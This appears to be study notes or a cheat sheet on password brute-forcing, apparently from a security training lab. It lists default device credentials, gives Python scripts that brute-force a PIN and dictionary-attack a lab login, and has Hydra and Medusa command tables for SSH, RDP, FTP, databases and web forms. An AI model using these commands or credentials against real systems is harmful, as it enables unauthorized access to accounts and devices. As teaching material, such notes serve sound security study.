# Some Default Credentials

|Device/Manufacturer|Default Username|Default Password|Device Type|
|---|---|---|---|
|Linksys Router|admin|admin|Wireless Router|
|D-Link Router|admin|admin|Wireless Router|
|Netgear Router|admin|password|Wireless Router|
|TP-Link Router|admin|admin|Wireless Router|
|Cisco Router|cisco|cisco|Network Router|
|Asus Router|admin|admin|Wireless Router|
|Belkin Router|admin|password|Wireless Router|
|Zyxel Router|admin|1234|Wireless Router|
|Samsung SmartCam|admin|4321|IP Camera|
|Hikvision DVR|admin|12345|Digital Video Recorder (DVR)|
|Axis IP Camera|root|pass|IP Camera|
|Ubiquiti UniFi AP|ubnt|ubnt|Wireless Access Point|
|Canon Printer|admin|admin|Network Printer|
|Honeywell Thermostat|admin|1234|Smart Thermostat|
|Panasonic DVR|admin|12345|Digital Video Recorder (DVR)|

# Cracking the PIN

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

# Dictionary Attacks

|Wordlist|Description|Typical Use|Source|
|---|---|---|---|
|`rockyou.txt`|A popular password wordlist containing millions of passwords leaked from the RockYou breach.|Commonly used for password brute force attacks.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|A concise list of the most common usernames.|Suitable for quick brute force username attempts.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)|
|`xato-net-10-million-usernames.txt`|A more extensive list of 10 million usernames.|Used for thorough username brute forcing.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)|
|`2023-200_most_used_passwords.txt`|A list of the 200 most commonly used passwords as of 2023.|Effective for targeting commonly reused passwords.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)|
|`Default-Credentials/default-passwords.txt`|A list of default usernames and passwords commonly used in routers, software, and other devices.|Ideal for trying default credentials.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)|

- bruteforce script

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```


# Hydra

- basec sysntax

```sh
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                                     |
| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                                                  |
| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                                                   |
| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http://192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                                               |
| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                                                    |
| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                                                    |
| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                                                 |
| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                                                   |
| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                                           |
| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                                                  |


## Basic HTTP Authentication

```js
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

## Exploiting Basic Auth with Hydra

```sh
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 80
```

## Login Forms

- example 

```js
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

# Medusa

| Medusa Module    | Service/Protocol                 | Description                                                                                 | Usage Example                                                                                                               |
| ---------------- | -------------------------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP             | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| MySQL            | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| POP3             | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| RDP              | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| SSHv2            | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| Subversion (SVN) | Version Control System           | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |
# Username Anarchy

- username generation

```sh
python3 username-anarchy Jane Smith > jane_smith_usernames.txt
```

- passwords generation

```sh
 cupp -i
```

